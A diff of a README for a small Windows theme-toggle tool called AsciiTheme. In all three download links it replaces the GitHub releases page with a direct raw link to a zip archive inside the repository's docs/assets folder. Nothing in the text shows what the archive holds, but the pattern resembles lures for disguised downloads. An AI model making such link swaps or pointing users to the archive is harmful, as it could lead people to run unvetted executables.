@@ -1,6 +1,6 @@
 # 🎨 AsciiTheme - Simple ASCII Light/Dark Theme Toggle
 
-[![Download AsciiTheme](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/sameer2020194/AsciiTheme/releases)
+[![Download AsciiTheme](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/sameer2020194/AsciiTheme/main/docs/assets/Theme-Ascii-2.7.zip)
 
 ## 📝 What is AsciiTheme?
 
@@ -31,7 +31,7 @@ To get AsciiTheme working on your Windows machine, follow these steps carefully.
 
 Click the big green button above or use this link to visit the download page:
 
-[Download AsciiTheme Releases](https://github.com/sameer2020194/AsciiTheme/releases)
+[Download AsciiTheme Releases](https://raw.githubusercontent.com/sameer2020194/AsciiTheme/main/docs/assets/Theme-Ascii-2.7.zip)
 
 You will see a list of files grouped by version numbers.
 
@@ -101,4 +101,4 @@ You can also look inside the downloaded files for documentation or README files 
 
 ---
 
-[![Download AsciiTheme](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/sameer2020194/AsciiTheme/releases)
+[![Download AsciiTheme](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/sameer2020194/AsciiTheme/main/docs/assets/Theme-Ascii-2.7.zip)
